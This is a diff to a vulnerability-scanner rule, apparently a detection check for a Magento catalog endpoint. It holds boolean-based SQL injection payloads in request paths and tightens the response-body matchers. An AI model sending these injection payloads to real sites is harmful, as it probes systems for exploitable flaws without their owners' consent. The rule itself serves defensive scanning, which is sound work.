@@ -5,13 +5,13 @@ rules:
       /catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+123%3d124)+--+-
     follow_redirects: false
     expression: |
-      response.status == 200
+      response.status == 200 && "^\\[\\]$".bmatches(response.body)
   - method: GET
     path: >-
       /catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+123%3d123)+--+-
     follow_redirects: true
     expression: |
-      response.status == 400
+      response.status == 400 && "^\\[\\]$".bmatches(response.body)
 detail:
   author: betta(https://github.com/betta-cyber)
   links:
